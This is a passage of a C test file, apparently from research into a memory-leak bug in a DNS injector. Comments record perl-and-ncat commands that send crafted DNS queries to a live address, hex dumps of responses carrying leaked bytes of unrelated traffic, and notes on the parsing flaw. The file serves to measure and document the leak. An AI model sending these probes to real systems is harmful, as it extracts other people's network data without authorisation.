$ (perl -e 'print "\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00\xffrsf.org\x00\x00"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
With digest:
[0000]   33 33 01 20 00 01 00 00   00 00 00 00 FF 72 73 66   33. .... .....rsf
[0010]   2E 6F 72 67 00 00                                   .org..
[0000]   33 33 81 80 00 01 00 01   00 00 00 00 FF 72 73 66   33...... .....rsf
[0010]   2E 6F 72 67 00 00 A6 50   9D D0 54 52 4F 4C 3A 20   .org...P ..TROL: 
[0020]   6D 61 78 2D 61 67 65 20   3D 20 31 32 30 0D 0A 45   max-age  = 120..E
[0030]   58 54 3A 20 0D 0A 4C 4F   43 41 54 49 4F 4E 3A 20   XT: ..LO CATION: 
[0040]   68 74 74 70 3A 2F 2F 31   39 32 2E 31 36 38 2E 31   http://1 92.168.1
[0050]   2E 31 3A 38 30 2F 55 50   6E 50 2F 49 47 44 2E 78   .1:80/UP nP/IGD.x
[0060]   6D 6C 0D 0A 53 54 3A 20   75 72 6E 3A 73 63 68 65   ml..ST:  urn:sche
[0070]   6D 61 73 2D 75 70 6E 70   2D 6F 72 67 3A 64 65 76   mas-upnp -org:dev
[0080]   69 63 65 3A 57 41 4E 43   6F 6E 6E 65 63 74 C0 0C   ice:WANC onnect..
[0090]   00 01 00 01 00 00 00 54   00 04 9D F0 0C 23         .......T .....#
Without digest:
[0000]   33 33 01 20 00 01 00 00   00 00 00 00 FF 72 73 66   33. .... .....rsf
[0010]   2E 6F 72 67 00 00                                   .org..
[0000]   33 33 81 80 00 01 00 01   00 00 00 00 FF 72 73 66   33...... .....rsf
[0010]   2E 6F 72 67 00 00 6F 73   74 3A 32 33 39 2E 32 35   .org..os t:239.25
[0020]   35 2E 32 35 35 2E 32 35   30 3A 31 39 30 30 0D 0A   5.255.25 0:1900..
[0030]   53 54 3A 73 73 64 70 3A   61 6C 6C 0D 0A 4D 61 6E   ST:ssdp: all..Man
[0040]   3A 22 73 73 64 70 3A 64   69 73 63 6F 76 65 72 22   :"ssdp:d iscover"
[0050]   0D 0A 4D 58 3A 33 0D 0A   0D 0A 9A 3D 58 EF 4E F7   ..MX:3.. ...=X.N.
[0060]   2B E5 2D 97 2F AB CD 30   FF F3 B3 A5 37 AB 39 6A   +.-./..0 ....7.9j
[0070]   0B F0 7D FD 43 CD 46 2E   DA 01 39 8B 4E 07 FA F3   ..}.C.F. ..9.N...
[0080]   A8 3F 3D 62 D2 D5 F8 FC   E7 C4 B9 71 D8 25 C0 0C   .?=b.... ...q.%..
[0090]   00 01 00 01 00 00 00 B1   00 04 C7 3B 95 D2         ........ ...;..
*/
TEST(
	"\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00\xff" "rsf.org" "\x00\x00", true,
	"\x33\x33\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00\xff" "rsf.org" "\x00\x00" "DDDD" "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" A_SUFFIX
),
TEST(
	"\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00\xff" "rsf.org" "\x00\x00", false,
	"\x33\x33\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00\xff" "rsf.org" "\x00\x00" "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" A_SUFFIX
),
/*
$ (perl -e 'print "\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00\xffrsf.org\x00\x00\x00"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
With digest:
[0000]   33 33 01 20 00 01 00 00   00 00 00 00 FF 72 73 66   33. .... .....rsf
[0010]   2E 6F 72 67 00 00 00                                .org...
[0000]   33 33 81 80 00 01 00 01   00 00 00 00 FF 72 73 66   33...... .....rsf
[0010]   2E 6F 72 67 00 00 00 E0   3F C6 F2 73 74 6F 6D 2F   .org.... ?..stom/
[0020]   31 2E 30 20 55 50 6E 50   2F 31 2E 30 20 50 72 6F   1.0 UPnP /1.0 Pro
[0030]   63 2F 56 65 72 0D 0A 45   58 54 3A 0D 0A 4C 6F 63   c/Ver..E XT:..Loc
[0040]   61 74 69 6F 6E 3A 20 68   74 74 70 3A 2F 2F 31 39   ation: h ttp://19
[0050]   32 2E 31 36 38 2E 31 2E   31 3A 35 34 33 31 2F 64   2.168.1. 1:5431/d
[0060]   79 6E 64 65 76 2F 75 75   69 64 3A 64 66 35 66 32   yndev/uu id:df5f2
[0070]   39 62 34 2D 61 33 61 33   2D 34 35 32 33 2D 39 63   9b4-a3a3 -4523-9c
[0080]   39 65 2D 64 35 39 32 30   36 64 33 35 63 65 C0 0C   9e-d5920 6d35ce..
[0090]   00 01 00 01 00 00 00 44   00 04 1F 0D 5E 31         .......D ....^1
Without digest:
[0000]   33 33 01 20 00 01 00 00   00 00 00 00 FF 72 73 66   33. .... .....rsf
[0010]   2E 6F 72 67 00 00 00                                .org...
[0000]   33 33 81 80 00 01 00 01   00 00 00 00 FF 72 73 66   33...... .....rsf
[0010]   2E 6F 72 67 00 00 00 30   0D 0A 43 6F 6E 74 65 6E   .org...0 ..Conten
[0020]   74 2D 54 79 70 65 3A 20   0D 0A 43 6F 6E 74 65 6E   t-Type:  ..Conten
[0030]   74 2D 4C 65 6E 67 74 68   3A 20 31 31 31 0D 0A 0D   t-Length : 111...
[0040]   0A 3C 3F 78 6D 6C 20 76   65 72 73 69 6F 6E 3D 22   .<?xml v ersion="
[0050]   31 2E 30 22 20 65 6E 63   6F 64 69 6E 67 3D 22 55   1.0" enc oding="U
[0060]   54 46 2D 38 22 3F 3E 3C   62 6F 64 79 3E 3C 73 65   TF-8"?>< body><se
[0070]   71 3E 31 38 32 34 37 39   31 38 35 38 3C 2F 73 65   q>182479 1858</se
[0080]   71 3E 3C 69 70 3E 38 35   2E 31 39 38 2E 32 C0 0C   q><ip>85 .198.2..
[0090]   00 01 00 01 00 00 00 98   00 04 9A 53 0E 86         ........ ...S..
*/
TEST(
	"\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00\xff" "rsf.org" "\x00\x00\x00", true,
	"\x33\x33\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00\xff" "rsf.org" "\x00\x00\x00" "DDDD" "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" A_SUFFIX
),
TEST(
	"\x33\x33\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00\xff" "rsf.org" "\x00\x00\x00", false,
	"\x33\x33\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00\xff" "rsf.org" "\x00\x00\x00" "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" A_SUFFIX
),
// When the QNAME is only 5 bytes long, the first leaked byte is always 0x00.
// The 0x00 byte also effectively serves as a terminator in the string parsed
// from the QNAME, which is why this query gets an injection despite there
// being nothing to terminate the "tt" label in the query itself.
/*
$ (perl -e 'print "\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00\x013\xfftt"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
[0000]   00 00 01 20 00 01 00 00   00 00 00 00 01 33 FF 74   ... .... .....3.t
[0010]   74                                                  t
[0000]   00 00 81 80 00 01 00 01   00 00 00 00 01 33 FF 74   ........ .....3.t
[0010]   74 00 2D 72 65 6C 61 79   2D 69 70 63 2D 6E 6A 2D   t.-relay -ipc-nj-
[0020]   30 30 0B 74 70 6C 69 6E   6B 63 6C 6F 75 64 03 63   00.tplin kcloud.c
[0030]   6F 6D 03 63 6E 50 00 00   01 00 01 DF E9 28 40 2E   om.cnP.. .....(@.
[0040]   69 44 17 85 44 E5 FC 00   A4 3D E0 08 75 C9 54 E2   iD..D... .=..u.T.
[0050]   23 6B B8 4D DF 69 F4 B7   69 B6 03 40 4A B9 A1 12   #k.M.i.. i..@J...
[0060]   B0 0C E0 3F 10 9B 86 89   82 AB 86 46 31 90 F6 55   ...?.... ...F1..U
[0070]   79 6C 37 5A 6B FA 3C C3   73 71 BE 31 DF FA D4 F7   yl7Zk.<. sq.1....
[0080]   D5 6F D2 C3 0C 89 39 98   0B EA 01 1D F4 16 C0 0C   .o....9. ........
[0090]   00 01 00 01 00 00 00 C0   00 04 45 32 DD 14         ........ ..E2..
*/
TEST(
	"\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00\x01" "3" "\xff" "tt", false,
	"\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00\x01" "3" "\xff" "tt" "\x00" "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" A_SUFFIX
),
// The same query with a 1-byte subdomain prepended increases the QNAME length
// from 5 to 7, at which point the query no longer gets an injection because
// there is nothing to terminate the "tt" label.
/*
$ (perl -e 'print "\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00\x01a\x013\xfftt"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
[0000]   00 00 01 20 00 01 00 00   00 00 00 00 01 61 01 33   ... .... .....a.3
[0010]   FF 74 74                                            .tt
*/
TEST(
	"\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00\x01" "a" "\x01" "3" "\xff" "tt", false,
	""
),
// The 7-byte QNAME (with the subdomain) gets an injection only if the query
// itself contains a 0x00 byte to terminate the name string.
/*
$ (perl -e 'print "\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00\x01a\x013\xfftt\x00"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
[0000]   00 00 01 20 00 01 00 00   00 00 00 00 01 61 01 33   ... .... .....a.3
[0010]   FF 74 74 00                                         .tt.
[0000]   00 00 81 80 00 01 00 01   00 00 00 00 01 61 01 33   ........ .....a.3
[0010]   FF 74 74 00 0A 48 4F 53   54 3A 20 32 33 39 2E 32   .tt..HOS T: 239.2
[0020]   35 35 2E 32 35 35 2E 32   35 30 3A 31 39 30 30 0D   55.255.2 50:1900.
[0030]   0A 4D 41 4E 3A 20 22 73   73 64 70 3A 64 69 73 63   .MAN: "s sdp:disc
[0040]   6F 76 65 72 22 0D 0A 4D   58 3A 20 32 0D 0A 53 54   over"..M X: 2..ST
[0050]   3A 20 73 73 64 70 3A 61   6C 6C 0D 0A 0D 0A FF 9D   : ssdp:a ll......
[0060]   AB C2 67 0B 78 76 BE 6C   0E 25 9D F9 63 61 11 8C   ..g.xv.l .%..ca..
[0070]   F1 E1 46 A2 CD 59 CF 9A   1E 0F D5 E8 EB 63 A3 87   ..F..Y.. .....c..
[0080]   3A 8A DA 5F 83 A0 3F 94   A7 10 85 B7 51 19 C0 0C   :.._..?. ....Q...
[0090]   00 01 00 01 00 00 00 60   00 04 68 F4 2E 5D         .......` ..h..]
*/
TEST(
	"\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00\x01" "a" "\x01" "3" "\xff" "tt" "\x00", false,
	"\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00\x01" "a" "\x01" "3" "\xff" "tt" "\x00" "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" A_SUFFIX
),

// This gets a 130-byte question section in the response.
/*
$ (perl -e 'print "\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" . "\x02aa" . "\x01a"x59 . "\x014\xfftt\x00"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
[0000]   00 00 01 00 00 01 00 00   00 00 00 00 02 61 61 01   ........ .....aa.
[0010]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0020]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0030]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0040]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0050]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0060]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0070]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0080]   61 01 61 01 61 01 34 FF   74 74 00                  a.a.a.4. tt.
[0000]   00 00 81 80 00 01 00 01   00 00 00 00 02 61 61 01   ........ .....aa.
[0010]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0020]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0030]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0040]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0050]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0060]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0070]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0080]   61 01 61 01 61 01 34 FF   74 74 00 1C 74 7E C0 0C   a.a.a.4. tt..t~..
[0090]   00 01 00 01 00 00 00 7F   00 04 C7 3B 94 F6         ........ ...;..
*/
TEST(
	"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" "\x02" "aa"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "4" "\xff" "tt" "\x00", false,
	"\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x02" "aa"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "4" "\xff" "tt" "\x00" "XXX" A_SUFFIX
),

// This gets a 131-byte question section in the response.
/*
$ (perl -e 'print "\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" . "\x02aa" . "\x01a"x59 . "\x014\x02tt\xff"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
[0000]   00 00 01 00 00 01 00 00   00 00 00 00 02 61 61 01   ........ .....aa.
[0010]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0020]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0030]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0040]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0050]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0060]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0070]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0080]   61 01 61 01 61 01 34 02   74 74 FF                  a.a.a.4. tt.
[0000]   00 00 81 80 00 01 00 01   00 00 00 00 02 61 61 01   ........ .....aa.
[0010]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0020]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0030]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0040]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0050]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0060]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0070]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0080]   61 01 61 01 61 01 34 02   74 74 FF C1 C7 05 45 C0   a.a.a.4. tt....E.
[0090]   0C 00 01 00 01 00 00 00   8A 00 04 1F 0D 57 09      ........ .....W.
*/
TEST(
	"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" "\x02" "aa"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "4" "\x02" "tt" "\xff", false,
	"\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x02" "aa"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "4" "\x02" "tt" "\xff" "XXXX" A_SUFFIX
),

// Changing the first "aa" label to "a" still results in a 131-byte question
// section.
/*
$ (perl -e 'print "\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" . "\x01a" . "\x01a"x59 . "\x014\xfftt\x00"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
[0000]   00 00 01 00 00 01 00 00   00 00 00 00 01 61 01 61   ........ .....a.a
[0010]   01 61 01 61 01 61 01 61   01 61 01 61 01 61 01 61   .a.a.a.a .a.a.a.a
[0020]   01 61 01 61 01 61 01 61   01 61 01 61 01 61 01 61   .a.a.a.a .a.a.a.a
[0030]   01 61 01 61 01 61 01 61   01 61 01 61 01 61 01 61   .a.a.a.a .a.a.a.a
[0040]   01 61 01 61 01 61 01 61   01 61 01 61 01 61 01 61   .a.a.a.a .a.a.a.a
[0050]   01 61 01 61 01 61 01 61   01 61 01 61 01 61 01 61   .a.a.a.a .a.a.a.a
[0060]   01 61 01 61 01 61 01 61   01 61 01 61 01 61 01 61   .a.a.a.a .a.a.a.a
[0070]   01 61 01 61 01 61 01 61   01 61 01 61 01 61 01 61   .a.a.a.a .a.a.a.a
[0080]   01 61 01 61 01 34 FF 74   74 00                     .a.a.4.t t.
[0000]   00 00 81 80 00 01 00 01   00 00 00 00 01 61 01 61   ........ .....a.a
[0010]   01 61 01 61 01 61 01 61   01 61 01 61 01 61 01 61   .a.a.a.a .a.a.a.a
[0020]   01 61 01 61 01 61 01 61   01 61 01 61 01 61 01 61   .a.a.a.a .a.a.a.a
[0030]   01 61 01 61 01 61 01 61   01 61 01 61 01 61 01 61   .a.a.a.a .a.a.a.a
[0040]   01 61 01 61 01 61 01 61   01 61 01 61 01 61 01 61   .a.a.a.a .a.a.a.a
[0050]   01 61 01 61 01 61 01 61   01 61 01 61 01 61 01 61   .a.a.a.a .a.a.a.a
[0060]   01 61 01 61 01 61 01 61   01 61 01 61 01 61 01 61   .a.a.a.a .a.a.a.a
[0070]   01 61 01 61 01 61 01 61   01 61 01 61 01 61 01 61   .a.a.a.a .a.a.a.a
[0080]   01 61 01 61 01 34 FF 74   74 00 EE CE 61 F3 C0 0C   .a.a.4.t t...a...
[0090]   00 01 00 01 00 00 00 57   00 04 68 F4 2E 34         .......W ..h..4
*/
TEST(
	"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "4" "\xff" "tt" "\x00", false,
	"\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "4" "\xff" "tt" "\x00"
	"XXXX" A_SUFFIX
),

// After removing any "a" label, the query that formerly triggered a 131-byte
// question section does not get a response anymore.
/*
$ (perl -e 'print "\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" . "\x02\x61\x61" . "\x01\x61"x58 . "\x014\x02tt\xff"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
[0000]   00 00 01 00 00 01 00 00   00 00 00 00 02 61 61 01   ........ .....aa.
[0010]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0020]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0030]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0040]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0050]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0060]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0070]   61 01 61 01 61 01 61 01   61 01 61 01 61 01 61 01   a.a.a.a. a.a.a.a.
[0080]   61 01 61 01 34 02 74 74   FF                        a.a.4.tt .
*/
TEST(
	"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" "\x02" "aa"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a" "\x01" "a"
	"\x01" "a" "\x01" "a"
	"\x01" "4" "\x02" "tt" "\xff", false,
	""
),

// When query_len == udp_len, the parser reads only 1 byte past the end of the
// query (for the next length prefix), then 4 additional bytes for QTYPE and
// QCLASS.
/*
$ (perl -e 'print "\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00\x08facebook\x04com\x00"'; cat) | ncat -x /dev/stderr --udp 212.64.11.0 53 > /dev/null
[0000]   00 00 01 20 00 01 00 00   00 00 00 00 08 66 61 63   ... .... .....fac
[0010]   65 62 6F 6F 6B 04 63 6F   6D 00                     ebook.co m.
[0000]   00 00 81 80 00 01 00 01   00 00 00 00 08 66 61 63   ........ .....fac
[0010]   65 62 6F 6F 6B 04 63 6F   6D 00 0F 01 80 C5 5D C0   ebook.co m.....].
[0020]   0C 00 01 00 01 00 00 00   56 00 04 68 F4 2B B6      ........ V..h.+.
$ perl -e 'print "\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00\x08facebook\x04com\x00"' | sudo ../util/gfw-scapy.py --raw --ip 212.64.11.0 --udplen 34
Sending 8 bytes UDP header + 26 bytes payload: 0000012000010000000000000866616365626f6f6b03636f6d00
0000818000010001000000000866616365626f6f6b04636f6d00ca871cbe7bc00c000100010000005e00041f0d4329
*/
TEST_UDPLEN(
	"\x00\x00\x01\x20\x00\x01\x00\x00\x00\x00\x00\x00" "\x08" "facebook" "\x04" "com\x00", 0, false,
	"\x00\x00\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" "\x08" "facebook" "\x04" "com\x00" "XXXXX" A_SUFFIX
),
// But if udp_len is even 1 byte greater than query_len, the loop does not
// terminate immediately after reading the byte that follows the query.
